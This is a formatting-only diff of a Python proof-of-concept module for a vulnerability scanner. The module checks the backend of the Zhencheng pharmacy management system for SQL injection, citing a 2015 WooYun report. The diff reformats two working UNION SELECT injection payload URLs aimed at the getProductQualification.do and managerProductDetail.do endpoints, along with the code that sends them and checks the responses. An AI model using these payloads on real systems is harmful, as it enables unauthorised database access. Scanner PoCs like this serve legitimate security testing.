@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urlparse
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'b2cGroup_0001' # 平台漏洞编号，留空
+    vuln_id = 'b2cGroup_0001'  # 平台漏洞编号，留空
     name = '珍诚药店管理系统后台 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-07-10'  # 漏洞公布时间
     desc = '''  
         珍诚药店管理系统后台两处SQL注入漏洞。
@@ -24,6 +25,7 @@ class Vuln(ABVuln):
     product = '珍诚药店管理系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '8d1b7940-010d-4eb3-9a62-7263130c89c3'
     author = '47bwy'  # POC编写者
@@ -36,13 +38,15 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer: http://www.wooyun.org/bugs/wooyun-2015-0124399
+
+            # refer: http://www.wooyun.org/bugs/wooyun-2015-0124399
             hh = hackhttp.hackhttp()
             arg = self.target
             payloads = [
-                    arg + '/getProductQualification.do?productCode=1000100887%27%20union%20all%20select%20NULL,%20NULL,%20NULL,%20NULL,%20CHR(58)||CHR(112)||CHR(119)||CHR(116)||CHR(102),NULL%20FROM%20DUAL--',
-                    arg + '/managerProductDetail.do?productid=9950004)%20union%20all%20select%20CHR(58)||CHR(112)||CHR(119)||CHR(116)||CHR(102),NULL%20FROM%20DUAL--',
+                arg +
+                '/getProductQualification.do?productCode=1000100887%27%20union%20all%20select%20NULL,%20NULL,%20NULL,%20NULL,%20CHR(58)||CHR(112)||CHR(119)||CHR(116)||CHR(102),NULL%20FROM%20DUAL--',
+                arg +
+                '/managerProductDetail.do?productid=9950004)%20union%20all%20select%20CHR(58)||CHR(112)||CHR(119)||CHR(116)||CHR(102),NULL%20FROM%20DUAL--',
             ]
             for payload in payloads:
                 code, head, res, err, _ = hh.http(payload)
@@ -56,6 +60,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
